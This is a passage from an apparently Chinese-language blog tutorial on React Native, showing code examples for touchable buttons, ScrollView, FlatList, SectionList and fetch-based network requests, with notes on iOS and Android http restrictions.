class="string">'#fff'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class="line">        &#123;<span class="comment">/* 组件的背景会在用户手指按下时变暗。 */</span>&#125;</span><br><span class="line">        &lt;TouchableHighlight onPress=&#123;<span class="keyword">this</span>._onPressButton&#125; underlayColor=<span class="string">"white"</span>&gt;</span><br><span class="line">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class="line">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableHighlight&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>View&gt;</span><br><span class="line">        &lt;<span class="regexp">/TouchableHighlight&gt;</span></span><br><span class="line"><span class="regexp">        &#123;/</span>* 用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">        &lt;TouchableOpacity onPress=&#123;this._onPressButton&#125;&gt;</span></span><br><span class="line"><span class="regexp">          &lt;View style=&#123;styles.button&#125;&gt;</span></span><br><span class="line"><span class="regexp">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableOpacity&lt;/</span>Text&gt;</span><br><span class="line">          &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>TouchableOpacity&gt;</span><br><span class="line">        &#123;<span class="comment">/* Android 用户手指按下时形成类似墨水涟漪的视觉效果。 */</span>&#125;</span><br><span class="line">        &lt;TouchableNativeFeedback</span><br><span class="line">            onPress=&#123;<span class="keyword">this</span>._onPressButton&#125;</span><br><span class="line">            background=&#123;Platform.OS === <span class="string">'android'</span> ? TouchableNativeFeedback.SelectableBackground() : <span class="string">''</span>&#125;&gt;</span><br><span class="line">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class="line">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableNativeFeedback&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>View&gt;</span><br><span class="line">        &lt;<span class="regexp">/TouchableNativeFeedback&gt;</span></span><br><span class="line"><span class="regexp">        &#123;/</span>* 不显示任何视觉反馈 *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">        &lt;TouchableWithoutFeedback</span></span><br><span class="line"><span class="regexp">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class="line"><span class="regexp">            &gt;</span></span><br><span class="line"><span class="regexp">          &lt;View style=&#123;styles.button&#125;&gt;</span></span><br><span class="line"><span class="regexp">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableWithoutFeedback&lt;/</span>Text&gt;</span><br><span class="line">          &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>TouchableWithoutFeedback&gt;</span><br><span class="line">        &#123;<span class="comment">/* 绑定单击 和 长按事件 */</span>&#125;</span><br><span class="line">        &lt;TouchableHighlight onPress=&#123;<span class="keyword">this</span>._onPressButton&#125; onLongPress=&#123;<span class="keyword">this</span>._onLongPressButton&#125; underlayColor=<span class="string">"white"</span>&gt;</span><br><span class="line">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class="line">            &lt;Text style=&#123;styles.buttonText&#125;&gt;Touchable <span class="keyword">with</span> Long Press&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>View&gt;</span><br><span class="line">        &lt;<span class="regexp">/TouchableHighlight&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>View&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="滚动视图"><a href="#滚动视图" class="headerlink" title="滚动视图"></a>滚动视图</h2><p><a href="https://reactnative.cn/docs/scrollview" target="_blank" rel="noopener"><code>ScrollView</code></a>是一个通用的可滚动的容器，你可以在其中放入多个组件和视图，而且这些组件并不需要是同类型的。ScrollView 不仅可以垂直滚动，还能水平滚动（通过<code>horizontal</code>属性来设置）。</p><p>下面的示例代码创建了一个垂直滚动的<code>ScrollView</code>，其中还混杂了图片和文字组件。</p><p><img src="/view/posts/e61ae078/ScrollView.gif" alt="ScrollView" style="zoom:50%;"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ScrollView style=&#123;&#123;<span class="attr">backgroundColor</span>: <span class="string">'#df02d0'</span>&#125;&#125;&gt;</span><br><span class="line">        &lt;Text style=&#123;&#123;<span class="attr">fontSize</span>:<span class="number">48</span>&#125;&#125;&gt;Scroll me plz&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Image source=&#123;require('./</span><span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;If you like&lt;/Text&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Scrolling down&lt;/Text&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;What'</span>s the best&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Image source=&#123;require('./</span><span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Framework around?&lt;/Text&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Image source=&#123;require('</span>./<span class="number">1.</span>png<span class="string">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class="string">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Text style=&#123;&#123;fontSize:80&#125;&#125;&gt;React Native&lt;/Text&gt;</span></span><br><span class="line"><span class="string">      &lt;/ScrollView&gt;</span></span><br><span class="line"><span class="string">  );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><code>ScrollView</code>适合用来显示数量不多的滚动元素。放置在<code>ScrollView</code>中的所有组件都会被渲染，哪怕有些组件因为内容太长被挤出了屏幕外。</p><h2 id="长列表"><a href="#长列表" class="headerlink" title="长列表"></a>长列表</h2><p><code>FlatList</code>组件用于显示一个==垂直的滚动列表==，其中的元素之间结构近似而仅数据不同。</p><p><code>FlatList</code>更适于==长列表数据，且元素个数可以增删。==和<a href="https://reactnative.cn/docs/using-a-scrollview" target="_blank" rel="noopener"><code>ScrollView</code></a>不同的是，<code>FlatList</code>并==不立即渲染所有元素，而是优先渲染屏幕上可见的元素。==</p><p><code>FlatList</code>组件必须的两个属性是<code>data</code>和<code>renderItem</code>。<code>data</code>是列表的数据源，而<code>renderItem</code>则从数据源中逐个解析数据，然后返回一个设定好格式的组件来渲染。</p><p><img src="/view/posts/e61ae078/FlatList.gif" alt="FlatList" style="zoom:50%;"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> styles = StyleSheet.create(&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">       flex: <span class="number">1</span>,</span><br><span class="line">       paddingTop: <span class="number">22</span></span><br><span class="line">      &#125;,</span><br><span class="line">      item: &#123;</span><br><span class="line">        padding: <span class="number">10</span>,</span><br><span class="line">        fontSize: <span class="number">18</span>,</span><br><span class="line">        height: <span class="number">44</span>,</span><br><span class="line">        borderBottomColor: <span class="string">'#f0f'</span>,</span><br><span class="line">        borderBottomWidth: <span class="number">1</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> arr = [ &#123;<span class="attr">key</span>: <span class="string">'Devin'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Julie'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Dan'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Dominic'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Jackson'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'James'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Joel'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'John'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Jillian'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Jimmy'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Dan'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Dominic'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Jackson'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'James'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Joel'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'John'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Jillian'</span>&#125;, &#123;<span class="attr">key</span>: <span class="string">'Jimmy'</span>&#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class="line">        &lt;FlatList</span><br><span class="line">          data=&#123; arr &#125;</span><br><span class="line">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item.key&#125;&lt;/Text&gt;&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>如果要渲染的是一组需要分组的数据，也许还带有分组标签的，那么<code>SectionList</code>将是个不错的选择</p><p><img src="/view/posts/e61ae078/SectionList.gif" alt="SectionList" style="zoom:50%;"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">'A'</span>, <span class="attr">data</span>: [<span class="string">'Aevin'</span>, <span class="string">'Aan'</span>, <span class="string">'Aominic'</span>]&#125;,</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">'B'</span>, <span class="attr">data</span>: [<span class="string">'Bevin'</span>, <span class="string">'Ban'</span>, <span class="string">'Bominic'</span>]&#125;,</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">'D'</span>, <span class="attr">data</span>: [<span class="string">'Devin'</span>, <span class="string">'Dan'</span>, <span class="string">'Dominic'</span>]&#125;,</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">'J'</span>, <span class="attr">data</span>: [<span class="string">'Jackson'</span>, <span class="string">'James'</span>, <span class="string">'Jillian'</span>, <span class="string">'Jimmy'</span>, <span class="string">'Joel'</span>, <span class="string">'John'</span>, <span class="string">'Julie'</span>]&#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class="line">        &lt;SectionList</span><br><span class="line">          sections=&#123;arr&#125;</span><br><span class="line">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item&#125;&lt;/Text&gt;&#125;</span><br><span class="line">          renderSectionHeader=&#123;(&#123;section&#125;) =&gt; &lt;Text style=&#123;styles.sectionHeader&#125;&gt;&#123;section.title&#125;&lt;/Text&gt;&#125;</span><br><span class="line">          keyExtractor=&#123;(item, index) =&gt; index&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">const styles = StyleSheet.create(&#123;</span></span><br><span class="line"><span class="regexp">  container: &#123;</span></span><br><span class="line"><span class="regexp">   flex: 1,</span></span><br><span class="line"><span class="regexp">   paddingTop: 22</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  sectionHeader: &#123;</span></span><br><span class="line"><span class="regexp">    paddingTop: 2,</span></span><br><span class="line"><span class="regexp">    paddingLeft: 10,</span></span><br><span class="line"><span class="regexp">    paddingRight: 10,</span></span><br><span class="line"><span class="regexp">    paddingBottom: 2,</span></span><br><span class="line"><span class="regexp">    fontSize: 14,</span></span><br><span class="line"><span class="regexp">    fontWeight: 'bold',</span></span><br><span class="line"><span class="regexp">    backgroundColor: 'rgba(247,247,247,1.0)',</span></span><br><span class="line"><span class="regexp">    borderTopWidth: 1,</span></span><br><span class="line"><span class="regexp">    borderTopColor: '#db5420'</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  item: &#123;</span></span><br><span class="line"><span class="regexp">    padding: 10,</span></span><br><span class="line"><span class="regexp">    fontSize: 18,</span></span><br><span class="line"><span class="regexp">    height: 44,</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br></pre></td></tr></table></figure><h2 id="网络（进行中）"><a href="#网络（进行中）" class="headerlink" title="网络（进行中）"></a>网络（进行中）</h2><h3 id="使用-Fetch"><a href="#使用-Fetch" class="headerlink" title="使用 Fetch"></a>使用 Fetch</h3><h4 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'https://mywebsite.com/endpoint/'</span>, &#123;</span><br><span class="line">  method: <span class="string">'POST'</span>,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    Accept: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  body: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">    firstParam: <span class="string">'yourValue'</span>,</span><br><span class="line">    secondParam: <span class="string">'yourOtherValue'</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="处理服务器的响应数据"><a href="#处理服务器的响应数据" class="headerlink" title="处理服务器的响应数据"></a>处理服务器的响应数据</h4><p>Fetch 方法会返回一个<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise" target="_blank" rel="noopener">Promise</a>，这种模式可以简化异步风格的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMoviesFromApiAsync</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fetch(<span class="string">'https://facebook.github.io/react-native/movies.json'</span>)</span><br><span class="line">    .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.json())</span><br><span class="line">    .then(<span class="function">(<span class="params">responseJson</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> responseJson.movies;</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.error(error);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// async/await 语法：</span></span><br><span class="line"><span class="comment">// 注意这个方法前面有async关键字</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getMoviesFromApi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 注意这里的await语句，其所在的函数必须有async关键字声明</span></span><br><span class="line">    <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(</span><br><span class="line">      <span class="string">'https://facebook.github.io/react-native/movies.json'</span>,</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">let</span> responseJson = <span class="keyword">await</span> response.json();</span><br><span class="line">    <span class="keyword">return</span> responseJson.movies;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试(catch 住<code>fetch</code>可能抛出的异常)</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state =&#123; <span class="attr">isLoading</span>: <span class="literal">true</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  componentDidMount()&#123;</span><br><span class="line">    <span class="comment">//  *****************</span></span><br><span class="line">    <span class="keyword">return</span> fetch(<span class="string">'https://facebook.github.io/react-native/movies.json'</span>)</span><br><span class="line">      .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.json())</span><br><span class="line">      .then(<span class="function">(<span class="params">responseJson</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">          isLoading: <span class="literal">false</span>,</span><br><span class="line">          dataSource: responseJson.movies,</span><br><span class="line">        &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function">(<span class="params">error</span>) =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  render()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.state.isLoading)&#123;</span><br><span class="line">      <span class="keyword">return</span>(</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">flex</span>: <span class="number">1</span>, <span class="attr">padding</span>: <span class="number">20</span>&#125;&#125;&gt;</span><br><span class="line">          &lt;ActivityIndicator/&gt;</span><br><span class="line">        &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">      )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    return(</span></span><br><span class="line"><span class="regexp">      &lt;View style=&#123;&#123;flex: 1, paddingTop:20&#125;&#125;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;FlatList</span></span><br><span class="line"><span class="regexp">          data=&#123;this.state.dataSource&#125;</span></span><br><span class="line"><span class="regexp">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text&gt;&#123;item.title&#125;, &#123;item.releaseYear&#125;&lt;/</span>Text&gt;&#125;</span><br><span class="line">          keyExtractor=&#123;(item, index) =&gt; item.id&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>从 Android9 开始，也会默认阻止 http 请求，请参考<a href="https://blog.csdn.net/qq_40347548/article/details/86766932" target="_blank" rel="noopener">相关配置</a></p></blockquote><blockquote><p>默认情况下，iOS 会阻止所有 http 的请求，以督促开发者使用 https。如果你仍然需要使用 http 协议，那么首先需要添加一个 App Transport Security 的例外，详细可参考<a href="https://segmentfault.com/a/1190000002933776" target="_blank" rel="noopener">这篇帖子</a>。</p></blockquote><h3 id="使用其他的网络库"><a href="#使用其他的网络库" class="headerlink" 